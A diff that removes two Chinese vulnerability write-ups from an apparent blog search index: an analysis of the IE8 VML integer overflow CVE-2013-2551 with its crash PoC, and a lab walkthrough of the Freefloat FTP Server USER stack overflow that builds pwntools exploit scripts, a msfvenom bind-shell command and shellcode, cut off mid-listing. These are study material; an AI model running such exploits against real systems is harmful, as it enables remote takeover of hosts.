@@ -152,268 +152,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CVE-2013-2551漏洞分析</title>
-    <url>/2021/08/18/CVE-2013-2551%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><h3 id="1-漏洞简述"><a href="#1-漏洞简述" class="headerlink" title="1. 漏洞简述"></a>1. 漏洞简述</h3><ul>
-<li>漏洞编号：CVE-2013-2551</li>
-<li>漏洞类型：整数溢出<span id="more"></span>
-<h3 id="2-概述"><a href="#2-概述" class="headerlink" title="2. 概述"></a>2. 概述</h3></li>
-</ul>
-<h2 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h2><h3 id="1-分析环境"><a href="#1-分析环境" class="headerlink" title="1. 分析环境"></a>1. 分析环境</h3><ul>
-<li>win7 x86 sp1</li>
-<li>windbg</li>
-<li>IDA PRO</li>
-<li>IExplore 8</li>
-</ul>
-<h3 id="2-背景知识"><a href="#2-背景知识" class="headerlink" title="2. 背景知识"></a>2. 背景知识</h3><p>Vector Markup Language (VML)是基于xml文件格式用于显示二维矢量图像的。</p>
-<p>标记使用的是XML扩展，需要一个namespace(命名空间)，可以使用惯用的“v”作为命名空间，而在这里，它的用处是把命名空间“v”和系统预定义的行为VML连接。</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns:v</span>=<span class="string">&quot;urn:schemas-microsoft-com:vml&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span></span><br><span class="line"><span class="css">v\:* &#123; Behavior: <span class="built_in">url</span>(<span class="string">#default#VML</span>) &#125;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>VML标记，shape可以为Oval(圆)，Line(线)等图形。 <a href="https://docs.microsoft.com/zh-cn/windows/win32/vml/shape-element--vml">Shape</a> 元素内可以定义 <a href="https://docs.microsoft.com/zh-cn/windows/win32/vml/msdn-online-vml-stroke-element">Stroke</a>元素：用来定义shape的笔划，stroke的属性 DashStyle 用于指定描边的点线和虚线图案，正是存在漏洞的属性</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">v:shape</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">v:stroke</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">v:shape</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3. 详细分析"></a>3. 详细分析</h3><p>获取POC，触发漏洞</p>
-<p>开启页堆，重新调试，进程出现地址访问错误</p>
-<img src="https://i.loli.net/2021/08/18/qTjRadhk8KJUEec.png" style="zoom:80%;" />
-
-<p>栈回溯</p>
-<img src="https://i.loli.net/2021/08/18/vhBTKMA8rZRkfE1.png" style="zoom:80%;" />
-
-<p>在vgx!ORG::GET 函数下断点，重新调试</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sxe ld vgx.dll   #使程序加载vgx.dll的时候断下</span><br><span class="line">bp vgx!ORG::Get</span><br></pre></td></tr></table></figure>
-
-<p>IDA加载VGX.dll，查看ORG::Get函数</p>
-<img src="https://i.loli.net/2021/08/18/nM51GtFeWimofEB.png" style="zoom:80%;" />
-
-<p>结合windbg调试，a1是一个this指针指向vftable，程序将a1的内容进行计算得到源地址，并赋值给a2，由于经a1得到的地址访问错误导致崩溃。因此需要找到改变vftable内容的函数</p>
-<img src="https://i.loli.net/2021/08/18/cURBtPO4MegWaId.png" style="zoom:80%;" />
-
-<p>这里无法找到漏洞成因，那么需要继续栈回溯到vgx!COALineDashStyleArray::get_item，由于函数的第一个参数是this指针，上一个调用函数不在vgx.dll中，回溯意义不大。</p>
-<img src="https://i.loli.net/2021/08/18/qSnUJC9e7vcwAbg.png" style="zoom:80%;" />
-
-<p>可以推断两个ORG::Get和get_item函数都是用于触发异常，简单的回溯无法判断漏洞位置，应该从poc入手</p>
-<h4 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h4><p>在创建好vml元素的命名空间后，调用函数createRects()，创建vml元素数组。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建vml元素数组</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createRects</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++) &#123;</span><br><span class="line">		rect_array[i] = <span class="built_in">document</span>.createElement(<span class="string">&quot;v:shape&quot;</span>)</span><br><span class="line">		rect_array[i].id = <span class="string">&quot;rect&quot;</span> + i.toString()</span><br><span class="line">		<span class="built_in">document</span>.body.appendChild(rect_array[i])</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>并定义两个vml元素vml1和shape，按钮button绑定点击事件crashme()，触发漏洞</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;v:oval&gt;</span><br><span class="line">	&lt;v:stroke id=<span class="string">&quot;vml1&quot;</span> /&gt;</span><br><span class="line">&lt;/v:oval&gt;</span><br><span class="line">&lt;v:oval&gt;</span><br><span class="line">	&lt;v:stroke dashstyle=<span class="string">&quot;2 2 2 0 2 2 2 0&quot;</span> id=<span class="string">&quot;shape&quot;</span> /&gt;</span><br><span class="line">&lt;/v:oval&gt;</span><br><span class="line">&lt;input value=<span class="string">&quot;crash!!!&quot;</span> type=<span class="string">&quot;button&quot;</span> onclick=<span class="string">&quot;crashme();&quot;</span>&gt;&lt;/input&gt;</span><br></pre></td></tr></table></figure>
-
-<p>crashme()将a数组元素设置为之前创建的v:shape数组的RuntimeStyle，最后设置vml1的dashstyle长度为44即0x2C</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++) &#123;</span><br><span class="line">	a[i] = <span class="built_in">document</span>.getElementById(<span class="string">&quot;rect&quot;</span> + i.toString())._vgRuntimeStyle;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++) &#123;</span><br><span class="line">	a[i].rotation;                                                   <span class="comment">//create a COARuntimeStyle</span></span><br><span class="line">	<span class="keyword">if</span> (i == <span class="number">0x300</span>) &#123;                                                <span class="comment">//allocate an ORG array of size 0x2c</span></span><br><span class="line">		vml1.dashstyle = <span class="string">&quot;1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>然后 dashstyle 数组长度被置为-1，显然造成了整数溢出漏洞，导致调用get_item()引发数组越界访问，触发漏洞。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">vml1.dashstyle.array.length = <span class="number">0</span> - <span class="number">1</span></span><br><span class="line">shape.dashstyle.array.length = <span class="number">0</span> - <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<p>存在整数溢出的函数一定与dashstyle有关，在Functions window搜索dashstyle，找到最可疑的函数，windbg下断点</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bp vgx!COALineDashStyleArray::put_length</span><br></pre></td></tr></table></figure>
-
-
-
-<img src="https://i.loli.net/2021/08/18/z86itLpGTKeECno.png" style="zoom:80%;" />
-
-<p>命中断点后单步运行，程序调用CElements获取DashStyleArray对象的长度，返回值eax=2c，正是poc中vml1.dashstyle数组长度，保存在this指针里</p>
-<img src="https://i.loli.net/2021/08/18/sfKSp6F2qJMRvXL.png" style="zoom:80%;" />
-
-<img src="https://i.loli.net/2021/08/18/O9ufwMzdBmeog3b.png" style="zoom:80%;" />
-
-<p>接着获取第二个参数FFFF即-1，计划将数组长度设置为目标长度-1。如果当前长度0x2c大于目标长度-1，则调用DeleteRange将多余的元素删除，使得数组长度等于目标长度</p>
-<img src="https://i.loli.net/2021/08/18/Rp38OqA7L5XzHca.png" style="zoom:80%;" />
-
-<img src="https://i.loli.net/2021/08/18/sgnJj1QSV5N6T4z.png" style="zoom:80%;" />
-
-<p>对应的 IDA 反编译代码位于COALineDashStyleArray::put_length()</p>
-<img src="https://i.loli.net/2021/08/18/1xori9kKzbgduwF.png" style="zoom:80%;" />
-
-<p>依次跟进DeleteRange()、MsoDeletePx()、MsoFRemovePx()，这三个函数的参数都相同，第一个this指针，第二个目标长度，第三个是需要删除的范围，即当前长度减目标长度</p>
-<img src="https://i.loli.net/2021/08/18/AGvIckwuhyn35WJ.png" style="zoom:80%;" />
-
-<img src="https://i.loli.net/2021/08/18/oI2EzTcYyOtfZWD.png" style="zoom:80%;" />
-
-<p>导致漏洞的位置在MsoFRemovePx()。进行调试，程序首先获取this指针</p>
-<img src="https://i.loli.net/2021/08/18/oulzL2SWmvbAkhR.png" style="zoom:80%;" />
-
-<p>获取数组每个单位的长度，这里是int，4个字节</p>
-<img src="https://i.loli.net/2021/08/18/8ewyScdYNt1JPzW.png" style="zoom:80%;" />
-
-<p>[esi+0Ch]为数组首地址，数组首地址+目标长度*每个单位长度 = 数组需要删除的部分首地址</p>
-<img src="https://i.loli.net/2021/08/18/yuJFL7afo8gqBlm.png" style="zoom:80%;" />
-
-<img src="https://i.loli.net/2021/08/18/WMvbp76e8NSyYwF.png" style="zoom:80%;" />
-
-<img src="https://i.loli.net/2021/08/18/le7OFNoAxISd6hU.png" style="zoom:80%;" />
-
-<p>对应c语言代码，v5 = 数组需要删除的部分首地址，主要执行了第10行和第11行两条语句，接下来跳过if语句</p>
-<img src="https://i.loli.net/2021/08/18/cQgIFMVzEYk2O6p.png" style="zoom:80%;" />
-
-<p>然后动态调试的部分c语言代码：</p>
-<img src="https://i.loli.net/2021/08/18/dHbiUOwqhLlk3EA.png" style="zoom:80%;" />
-
-<p>这个if语句也不满足，跳转指向更新数组长度的语句，更新前vftable中保存的长度为2c，更新后长度为ffff，易造成数组访问越界</p>
-<img src="https://i.loli.net/2021/08/18/4Po6SZKxdQjkqyH.png" style="zoom:80%;" />
-
-
-
-<h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><h3 id="1-利用条件"><a href="#1-利用条件" class="headerlink" title="1. 利用条件"></a>1. 利用条件</h3><h3 id="2-利用过程"><a href="#2-利用过程" class="headerlink" title="2. 利用过程"></a>2. 利用过程</h3><h2 id="四、参考文献"><a href="#四、参考文献" class="headerlink" title="四、参考文献"></a>四、参考文献</h2><ul>
-<li>《漏洞战争》</li>
-</ul>
-]]></content>
-      <categories>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>整数溢出</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Freefloat FTP Server1.0栈溢出漏洞分析</title>
-    <url>/2021/03/31/freefloatftpserver1.0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><h3 id="1-漏洞简述"><a href="#1-漏洞简述" class="headerlink" title="1. 漏洞简述"></a>1. 漏洞简述</h3><ul>
-<li>漏洞名称：Freefloat FTP server – ‘USER’ Remote Buffer Overflow</li>
-<li>漏洞编号：EDB-ID 23243</li>
-<li>漏洞类型：栈溢出</li>
-<li>漏洞影响：远程代码执行</li>
-<li>利用难度：Esay</li>
-</ul>
-<span id="more"></span>
-<h3 id="2-组件概述"><a href="#2-组件概述" class="headerlink" title="2. 组件概述"></a>2. 组件概述</h3><p>freefloatftpserver1.0 用于打开ftp服务，用于上传文件和管理有线及无线设备的软件</p>
-<h3 id="3-漏洞影响"><a href="#3-漏洞影响" class="headerlink" title="3. 漏洞影响"></a>3. 漏洞影响</h3><p>freefloatftpserver1.0</p>
-<h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><ul>
-<li>靶机环境：Windows xp sp3</li>
-<li>靶机配置：<ul>
-<li> freefloatftpserver1.0</li>
-<li> Immunity Debugger</li>
-<li> Mona</li>
-</ul>
-</li>
-<li>攻击机：kali 2.0</li>
-<li>攻击机配置<ul>
-<li>­    Pwntools</li>
-<li>­    Metasploit</li>
-</ul>
-</li>
-</ul>
-<h3 id="2-复现过程"><a href="#2-复现过程" class="headerlink" title="2. 复现过程"></a>2. 复现过程</h3><p>使用两种工具Infigo FTPStress Fuzzer和Metasploit都能测试出溢出漏洞存在</p>
-<h4 id="2-1-使用Infigo-FTPStress-Fuzzer触发漏洞"><a href="#2-1-使用Infigo-FTPStress-Fuzzer触发漏洞" class="headerlink" title="2.1 使用Infigo FTPStress Fuzzer触发漏洞"></a>2.1 使用Infigo FTPStress Fuzzer触发漏洞</h4><h5 id="2-1-1-在windowsXP运行漏洞程序，程序打开ftp服务，并监听21号端口"><a href="#2-1-1-在windowsXP运行漏洞程序，程序打开ftp服务，并监听21号端口" class="headerlink" title="2.1.1 在windowsXP运行漏洞程序，程序打开ftp服务，并监听21号端口"></a>2.1.1 在windowsXP运行漏洞程序，程序打开ftp服务，并监听21号端口</h5><img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/1.png?raw=true" style="zoom:80%">
-
-<h5 id="2-1-2-ftpfuzz触发漏洞"><a href="#2-1-2-ftpfuzz触发漏洞" class="headerlink" title="2.1.2 ftpfuzz触发漏洞"></a>2.1.2 ftpfuzz触发漏洞</h5><img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/2.png?raw=true" style="zoom:80%">
-
-<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/3.png?raw=true" style="zoom:60%">
-
-<p>eip指向fuzz发送的测试数组‘AAAA‘，程序执行流已被更改，存在溢出漏洞</p>
-<h4 id="2-2-使用metasploit的ftp-fuzz进行测试"><a href="#2-2-使用metasploit的ftp-fuzz进行测试" class="headerlink" title="2.2 使用metasploit的ftp fuzz进行测试"></a>2.2 使用metasploit的ftp fuzz进行测试</h4><p>攻击机kali运行metasploit，运行如下命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">打开metasploit</span></span><br><span class="line">msfconsole</span><br><span class="line"><span class="meta">#</span><span class="bash">查询可用的fuzz</span></span><br><span class="line">search fuzzing</span><br><span class="line"><span class="meta">#</span><span class="bash">使用ftp fuzz模块</span></span><br><span class="line">use auxiliary/fuzzers/ftp/ftp_pre_post</span><br><span class="line"><span class="meta">#</span><span class="bash">设置靶机</span></span><br><span class="line">set RHOST 192.168.112.146</span><br><span class="line"><span class="meta">#</span><span class="bash">漏洞利用</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-
-<p>运行结果</p>
-<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/4.png?raw=true" style="zoom:70%">
-<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/5.png?raw=true" style="zoom:60%">
-
-<p>靶机崩溃，eip指向未知内存地址，可以溢出</p>
-<h2 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h2><h3 id="1-背景知识"><a href="#1-背景知识" class="headerlink" title="1. 背景知识"></a>1. 背景知识</h3><p>最简单的栈溢出，jmp esp作为跳板跳转到栈中执行</p>
-<h3 id="2-详细分析"><a href="#2-详细分析" class="headerlink" title="2. 详细分析"></a>2. 详细分析</h3><h4 id="2-1-Immunity-Debugger调试"><a href="#2-1-Immunity-Debugger调试" class="headerlink" title="2.1 Immunity Debugger调试"></a>2.1 Immunity Debugger调试</h4><p>在靶机用Immunity Debugger打开freefloatftpserver1.0运行调试</p>
-<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/6.png?raw=true" style="zoom:80%">
-
-<h4 id="2-2-python发包测试"><a href="#2-2-python发包测试" class="headerlink" title="2.2 python发包测试"></a>2.2 python发包测试</h4><p>在kali攻击机用pwntools编写脚本，向ftp服务器的USER输入点发送数据包测试</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;192.168.112.146&quot;</span>, <span class="number">21</span>)</span><br><span class="line">paylad = <span class="string">&#x27;A&#x27;</span>*<span class="number">500</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>程序崩溃，eip指向0x41414141，由发送的数据A的ascii码为0x41可知，USER输入点存在溢出漏洞</p>
-<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/7.png?raw=true" style="zoom:80%">
-
-<h4 id="2-3-定位溢出点"><a href="#2-3-定位溢出点" class="headerlink" title="2.3 定位溢出点"></a>2.3 定位溢出点</h4><p>输入用户名之前，程序会输出一条ftp服务器版本的语句，在immunity debugger中定位输出这句话的函数，从而缩小定位漏洞函数的范围</p>
-<p><img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/8.png?raw=true" alt="my-logo.png"></p>
-<p>查询字符串</p>
-<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/9.png?raw=true" style="zoom:80%">
-
-<p>在wsprintw函数设置断点</p>
-<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/10.png?raw=true" style="zoom:80%">
-
-<p>重新发送payload，单步调试，直到运行到出现异常的函数freefloa.004020E0</p>
-<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/11.png?raw=true" style="zoom:80%">
-
-<p>在freefloa.004020E0函数设置断点，重新发送payload，f7单步步入此函数</p>
-<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/12.png?raw=true" style="zoom:80%">
-
-<p>重复上述操作，接着在freefloa.00402190函数设置断点，单步步入，程序会在运行到00402881处跳转到004028EB处执行，之后调用freefloa.00402DE0函数，程序崩溃</p>
-<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/13.png?raw=true" style="zoom:80%">
-
-<p>在freefloa.00402DE0函数设置断点，步入之后未发现存在子函数，并且在返回的时候执行retn 8指令</p>
-<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/14.png?raw=true" style="zoom:80%">
-
-<p>观察此时esp指向的返回地址为0x41414141，执行retn命令之后eip指向0x41414141，使得程序崩溃</p>
-<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/15.png?raw=true" style="zoom:80%">
-
-<p>得出结论：freefloa.00402DE0函数可能出现栈溢出</p>
-<h4 id="2-4-静态分析结合动态分析"><a href="#2-4-静态分析结合动态分析" class="headerlink" title="2.4 静态分析结合动态分析"></a>2.4 静态分析结合动态分析</h4><p>用IDA加载程序进行静态分析，定位到函数sub_00402DE0</p>
-<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/16.png?raw=true" style="zoom:80%">
-
-<p>Strcpy函数存在溢出漏洞，将函数第三个参数a3的值复制到局部变量v8中，如果a3过长，会覆盖返回地址，那sub_00402DE0函数的参数a2，a3到底是什么？这就回溯到调用此函数的位置了，通过之前动态分析可以得到调用函数为00402190，IDA静态分析分析得Sub_00402190将输入的字符串与各种ftp命令进行比较，根据命令进行不同的响应。</p>
-<p>用immunity debugger回溯到sub_00402190函数里的00402881地址，这个地址的指令跳转执行漏洞函数00402DE0，查看栈帧能够获得参数</p>
-<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/18.png?raw=true" style="zoom:80%">
-
-<p>在IDA中定位，aXommandNotUnde就是上图的command not understood字符串，此处跳转执行402DE0</p>
-<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/19.png?raw=true" style="zoom:80%">
-
-<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/20.png?raw=true" style="zoom:80%">
-
-<p>参数1 V16是输入字符串长度，参数2 v17是输入字符串‘AAAA‘:command not understood’ 查看函数栈帧可验证</p>
-<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/21.png?raw=true" style="zoom:80%">
-
-<p>结论：函数sub_402DE0栈帧结构，（ebp实际不存在，只是方便记录相对偏移）</p>
-<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/22.png?raw=true" style="zoom:80%">
-
-<p>只需填充0xFC-1个垃圾数据可溢出到函数返回地址（-1是因为程序在输入字符串前添加了单引号），重新组织poc，返回地址为cccc</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;192.168.112.146&quot;</span>, <span class="number">21</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*(<span class="number">0xfc</span>-<span class="number">1</span>) + <span class="string">&#x27;cccc&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>返回地址为0x63636363，是cccc的ascii码，验证成功</p>
-<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/23.png?raw=true" style="zoom:80%">
-
-
-<h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4. 漏洞利用"></a>4. 漏洞利用</h3><h4 id="1-利用条件"><a href="#1-利用条件" class="headerlink" title="1. 利用条件"></a>1. 利用条件</h4><p>Windows xp sp3未开启DEP保护</p>
-<h4 id="2-利用过程"><a href="#2-利用过程" class="headerlink" title="2. 利用过程"></a>2. 利用过程</h4><h5 id="1-排除坏字符"><a href="#1-排除坏字符" class="headerlink" title="1. 排除坏字符"></a>1. 排除坏字符</h5><p>在生成shellcode之前需要确定坏字符，用mona生成一个0x00到0xff的bytearray，发送payload，比对哪个字符发送后会破坏payload，将其排除即可</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;192.168.112.146&#x27;</span>,<span class="number">21</span>)</span><br><span class="line"><span class="built_in">bytearray</span> = (</span><br><span class="line"><span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f&quot;</span></span><br><span class="line"><span class="string">&quot;\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f&quot;</span></span><br><span class="line"><span class="string">&quot;\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f&quot;</span></span><br><span class="line"><span class="string">&quot;\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f&quot;</span></span><br><span class="line"><span class="string">&quot;\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf&quot;</span></span><br><span class="line"><span class="string">&quot;\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf&quot;</span></span><br><span class="line"><span class="string">&quot;\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xfc</span>-<span class="number">1</span>) + <span class="string">&#x27;cccc&#x27;</span> + <span class="built_in">bytearray</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h5 id="2-生成shellcode"><a href="#2-生成shellcode" class="headerlink" title="2. 生成shellcode"></a>2. 生成shellcode</h5><p>利用metasploit生成windows反弹shell的shellcode，排除坏数据’\x00\x0a\x0d’，以c语言格式输出，靶机IP192.168.112.146</p>
-<p><code>msfvenom -p windows/shell_bind_tcp LHOSTS=192.168.112.146 LPORT=4444 -b &#39;\x00\x0a\x0d&#39; -f c</code></p>
-<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/24.png?raw=true" style="zoom:60%">
-
-<h5 id="3-内存中查找jmp-esp命令"><a href="#3-内存中查找jmp-esp命令" class="headerlink" title="3. 内存中查找jmp esp命令"></a>3. 内存中查找jmp esp命令</h5><p>使用mona插件查询jmp esp指令的地址</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">!mona jmp -r esp</span><br><span class="line"><span class="comment">#或者 </span></span><br><span class="line">!mona find -s <span class="string">&quot;\xff\xe4&quot;</span> -m</span><br></pre></td></tr></table></figure>
-
-<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/25.png?raw=true" style="zoom:80%">
-
-<p>从中选择一个地址0x77D29353，作为跳板，跳转到栈上执行shellcode</p>
-<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/26.png?raw=true" style="zoom:80%">
-
-<p>最终Exploit.py</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;192.168.112.146&#x27;</span>,<span class="number">21</span>)</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line"><span class="string">&quot;\xbf\xb9\x9b\xb3\x2f\xdb\xd2\xd9\x74\x24\xf4\x58\x33\xc9\xb1&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x31\x78\x12\x83\xc0\x04\x03\xc1\x95\x51\xda\xcd\x42\x17&quot;</span></span><br><span class="line"><span class="string">&quot;\x25\x2d\x93\x78\xaf\xc8\xa2\xb8\xcb\x99\x95\x08\x9f\xcf\x19&quot;</span></span><br><span class="line"><span class="string">&quot;\xe2\xcd\xfb\xaa\x86\xd9\x0c\x1a\x2c\x3c\x23\x9b\x1d\x7c\x22&quot;</span></span><br><span class="line"><span class="string">&quot;\x1f\x5c\x51\x84\x1e\xaf\xa4\xc5\x67\xd2\x45\x97\x30\x98\xf8&quot;</span></span><br><span class="line"><span class="string">&quot;\x07\x34\xd4\xc0\xac\x06\xf8\x40\x51\xde\xfb\x61\xc4\x54\xa2&quot;</span></span><br><span class="line"><span class="string">&quot;\xa1\xe7\xb9\xde\xeb\xff\xde\xdb\xa2\x74\x14\x97\x34\x5c\x64&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\x9a\xa1\x48\xab\xe2\xe6\x6f\x54\x91\x1e\x8c\xe9\xa2\xe5&quot;</span></span><br><span class="line"><span class="string">&quot;\xee\x35\x26\xfd\x49\xbd\x90\xd9\x68\x12\x46\xaa\x67\xdf\x0c&quot;</span></span><br><span class="line"><span class="string">&quot;\xf4\x6b\xde\xc1\x8f\x90\x6b\xe4\x5f\x11\x2f\xc3\x7b\x79\xeb&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\xda\x27\x5a\x92\x3c\x88\x03\x36\x37\x25\x57\x4b\x1a\x22&quot;</span></span><br><span class="line"><span class="string">&quot;\x94\x66\xa4\xb2\xb2\xf1\xd7\x80\x1d\xaa\x7f\xa9\xd6\x74\x78&quot;</span></span><br><span class="line"><span class="string">&quot;\xce\xcc\xc1\x16\x31\xef\x31\x3f\xf6\xbb\x61\x57\xdf\xc3\xe9&quot;</span></span><br><span class="line"><span class="string">&quot;\xa7\xe0\x11\x87\xaf\x47\xca\xba\x52\x37\xba\x7a\xfc\xd0\xd0&quot;</span></span><br><span class="line"><span class="string">&quot;\x74\x23\xc0\xda\x5e\x4c\x69\x27\x61\x63\x36\xae\x87\xe9\xd6&quot;</span></span><br><span class="line"><span class="string">&quot;\xe6\x10\x85\x14\xdd\xa8\x32\x66\x37\x81\xd4\x2f\x51\x16\xdb&quot;</span></span><br><span class="line"><span class="string">&quot;\xaf\x77\x30\x4b\x24\x94\x84\x6a\x3b\xb1\xac\xfb\xac\x4f\x3d&quot;</span></span><br><span class="line"><span class="string">&quot;\x4e\x4c\x4f\x14\x38\xed\xc2\xf3\xb8\x78\xff\xab\xef\x2d\x31&quot;</span></span><br><span class="line"><span 